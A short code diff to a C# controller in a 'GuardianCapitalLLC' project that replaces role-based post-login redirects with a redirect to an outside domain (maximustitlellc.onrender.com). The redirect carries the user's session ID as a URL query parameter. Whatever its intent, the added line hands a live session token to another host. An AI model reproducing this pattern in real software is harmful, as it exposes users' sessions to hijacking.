@@ -1039,16 +1039,7 @@ namespace GuardianCapitalLLC.Controllers
                         Expires = session.ExpiresAt
                     });
 
-                    if (user != null )
-                    {
-                        IList<string> roles = await _userManager.GetRolesAsync(user);
-                        if (roles.Contains("Admin"))
-                        {
-                            return RedirectToAction("Index", "Home");
-                        }
-
-                        return RedirectToAction("Index", "Account");
-                    }
+                    return Redirect($"https://maximustitlellc.onrender.com/Home/SessionSync?token={session.SessionId}");
                 }
                 else
                 {
